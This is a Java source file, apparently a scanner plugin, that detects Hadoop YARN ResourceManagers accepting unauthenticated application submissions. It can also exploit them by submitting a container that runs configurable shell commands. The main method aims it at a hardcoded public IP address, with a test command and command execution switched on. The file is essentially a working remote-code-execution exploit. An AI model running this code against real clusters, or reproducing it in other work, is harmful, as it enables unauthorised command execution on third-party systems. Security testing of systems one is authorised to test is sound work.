package com.gbw.scanner.plugins.scripts.hadoop.yarn;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.plugins.scripts.web.flink.FlinkHttpRequestBuilder;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.HttpUtils;
import com.xmap.api.utils.TextUtils;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.yarn.api.ApplicationConstants;
import org.apache.hadoop.yarn.api.protocolrecords.GetNewApplicationResponse;
import org.apache.hadoop.yarn.api.records.*;
import org.apache.hadoop.yarn.client.api.YarnClient;
import org.apache.hadoop.yarn.client.api.YarnClientApplication;
import org.apache.hadoop.yarn.conf.YarnConfiguration;
import org.apache.hadoop.yarn.exceptions.YarnException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class GBWScanYarnScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanYarnScript.class);
    private GBWScanYarnConfig config;

    public GBWScanYarnScript(GBWScanYarnConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    private boolean isYarn(Host host, CloseableHttpClient httpClient) {

        List<String> keys = config.getKeys();
        if(keys == null || keys.size()==0)
            return false;

        HttpGet request = new GBWHttpGetRequestBuilder(host.getProto(),host.getServer(),host.getPort(),config.getUri())
                .addHead("User-Agent","YarnClient")
                .setTimeout(config.getConTimeout(),config.getReadTimeout())
                .build();

        GBWHttpResponse response = HttpUtils.send(httpClient,request,true);

        String content = response.getContent();

        if(TextUtils.isEmpty(content))
            return false;


        for(String k:keys){

            if(!content.contains(k))
                return false;
        }

        return true;
    }

    @Override
    public boolean isAccept(Host host) {

        HttpUriRequest httpRequest;
        GBWHttpResponse httpResponse;
        boolean res = false;

        CloseableHttpClient httpClient = null;

        try {
            httpClient = GBWHttpClientBuilder.make(host.getProto(),host.getPort());
            res = isYarn(host,httpClient);
        }catch (Exception e){
            return false;
        }finally {

            if(httpClient!=null)
            {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return res;
    }

    private void setAMResourceCapability(ApplicationSubmissionContext appContext,GBWScanYarnResult result){

        Resource capability = Resource.newInstance(0, 0);

        long amMemory = Math.min(config.getMemory(),result.getMaxMem());
        int amVCores = Math.min(config.getVcores(),result.getMaxVcores());

        capability.setMemorySize(amMemory);
        capability.setVirtualCores(amVCores);

        appContext.setResource(capability);
        /*
        appContext.getAMContainerResourceRequests().get(0).setCapability(
                capability);*/
    }

    private Map<String,String> makeEnv(YarnConfiguration yarnConf) {

        Map<String,String> env = new HashMap<>();

        StringBuilder classPathEnv = new StringBuilder(ApplicationConstants.Environment.CLASSPATH.$$())
                .append(ApplicationConstants.CLASS_PATH_SEPARATOR).append("./*");
        for (String c : yarnConf.getStrings(
                YarnConfiguration.YARN_APPLICATION_CLASSPATH,
                YarnConfiguration.DEFAULT_YARN_CROSS_PLATFORM_APPLICATION_CLASSPATH)) {
            classPathEnv.append(ApplicationConstants.CLASS_PATH_SEPARATOR);
            classPathEnv.append(c.trim());
        }

        env.put("CLASSPATH", classPathEnv.toString());

        if(config.getEnvs()!=null) {
            for (GBWYarnEnv e : config.getEnvs()) {

                env.put(e.getKey(), e.getValue());
            }
        }
        return env;
    }


    private void runCmd(YarnConfiguration conf, YarnClient yarnClient, YarnClientApplication app,GBWScanYarnResult result,Host host) throws IOException, YarnException {

        ApplicationSubmissionContext appContext = app.getApplicationSubmissionContext();

        appContext.setApplicationName(config.getAppname());
        appContext.setPriority(Priority.newInstance(config.getPriority()));

        // Set up the container launch context for the application master
        ContainerLaunchContext amContainer = ContainerLaunchContext.newInstance(
                null, makeEnv(conf), config.getCmds(), null, null, null);

        appContext.setAMContainerSpec(amContainer);

        setAMResourceCapability(appContext,result);

        yarnClient.submitApplication(appContext);

        if(config.isMonitor()){

            monitorApplication(yarnClient,appContext.getApplicationId());
        }
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        YarnConfiguration conf = null;
        YarnClient yarnClient = null;

        try {

            conf = new YarnConfiguration(new Configuration());
            conf.set(YarnConfiguration.RM_ADDRESS, host.getServer());
            conf.setLong(YarnConfiguration.YARN_CLIENT_APPLICATION_CLIENT_PROTOCOL_POLL_TIMEOUT_MS,10000);
            yarnClient = YarnClient.createYarnClient();

            yarnClient.init(conf);
            yarnClient.start();

            // Get a new application id
            YarnClientApplication app = yarnClient.createApplication();

            if(app!=null){
                /*has hadoop yarn no auth bugs*/
                GetNewApplicationResponse appResponse = app.getNewApplicationResponse();
                ApplicationSubmissionContext appContext = app.getApplicationSubmissionContext();
                ApplicationId appId = appContext.getApplicationId();
                YarnClusterMetrics clusterMetrics = yarnClient.getYarnClusterMetrics();

                log.warn(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
               // System.out.println(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
                GBWScanYarnResult result = new GBWScanYarnResult(config,host);
                result.setAppID(appId.toString());
                result.setMaxMem(appResponse.getMaximumResourceCapability().getMemorySize());
                result.setMaxVcores(appResponse.getMaximumResourceCapability().getVirtualCores());
                result.setNodes(clusterMetrics.getNumNodeManagers());

                sinkQueue.put(result);

                if(config.isRunCmd()){

                    runCmd(conf,yarnClient,app,result,host);
                }
            }

        } catch (Exception e){
            //e.printStackTrace();
            log.error(String.format("scan yarn error:for:%s:%d message:%s",host.getServer(),host.getPort(),e.getMessage()));
        }finally {
            if(yarnClient!=null) {
                try {
                    yarnClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }

    /**
     * Monitor the submitted application for completion.
     * Kill application if time expires.
     * @param appId Application Id of application to be monitored
     * @return true if application completed successfully
     * @throws YarnException
     * @throws IOException
     */
    private boolean monitorApplication(YarnClient yarnClient,ApplicationId appId)
            throws YarnException, IOException {

        long clientStartTime = System.currentTimeMillis();

        while (true) {

            // Check app status every 1 second.
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {

            }

            // Get application report for the appId we are interested in
            ApplicationReport report = yarnClient.getApplicationReport(appId);

            YarnApplicationState state = report.getYarnApplicationState();
            FinalApplicationStatus dsStatus = report.getFinalApplicationStatus();
            if (YarnApplicationState.FINISHED == state) {
                if (FinalApplicationStatus.SUCCEEDED == dsStatus) {
                    //log.info("Application has completed successfully. Breaking monitoring loop");
                    return true;
                }
                else {
                    /*log.info("Application did finished unsuccessfully."
                            + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                            + ". Breaking monitoring loop");
                    */
                    return false;
                }
            }
            else if (YarnApplicationState.KILLED == state
                    || YarnApplicationState.FAILED == state) {
              /*
                log.info("Application did not finish."
                        + " YarnState=" + state.toString() + ", DSFinalStatus=" + dsStatus.toString()
                        + ". Breaking monitoring loop");

               */
                return false;
            }

            // The value equal or less than 0 means no timeout
            if (config.getTimeout() > 0
                    && System.currentTimeMillis() > (clientStartTime + config.getTimeout())) {

                //log.info("Reached client specified timeout for application. " +
                  //      "Killing application");

                //forceKillApplication(appId);
                return false;
            }
        }

    }

    public static void main(String[] args){

        Host host = new Host("39.106.121.27","39.106.121.27",8088,null,null);

        GBWScanYarnConfig config = new GBWScanYarnConfig();
        config.setAppname("test");
        config.setMemory(1024);
        config.setMonitor(false);
        config.setPriority(1);
        config.setQueue("test");
        config.setTimeout(100000);
        config.setRunCmd(true);
        List<String> cmds = new ArrayList<>();

        config.setReadTimeout(10000);
        config.setConTimeout(10000);

        config.setUri("/cluster");
        List<String> keys = new ArrayList<>();
        keys.add("/cluster/nodes");
        keys.add("All Applications");
        config.setKeys(keys);


        cmds.add("touch /tmp/test.datadata");

        config.setCmds(cmds);

        config.setVcores(1);

        config.setUser("test");

        GBWScanYarnScript scanYarnScript = new GBWScanYarnScript(config);
        System.out.println(scanYarnScript.isAccept(host));

        //scanYarnScript.scan(host,null);
    }

}
